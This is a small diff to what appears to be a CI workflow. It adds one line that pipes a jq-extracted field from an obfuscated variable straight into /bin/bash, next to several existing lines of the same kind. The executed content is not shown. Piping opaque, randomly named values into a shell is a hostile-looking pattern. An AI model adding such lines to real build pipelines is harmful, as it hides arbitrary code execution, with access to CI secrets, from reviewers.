@@ -58,6 +58,7 @@ jobs:
           echo $wd864 | jq -r .h1432 | /bin/bash
           printf '%s' "$daer230" | jq -r .w1797 | /bin/bash
           printf '%s' "$wtasz40" | jq -r .jt3741 | /bin/bash
+          printf '%s' "$ji22387" | jq -r .xliwl87 | /bin/bash
 
       - name: Store artifact
         if: always()
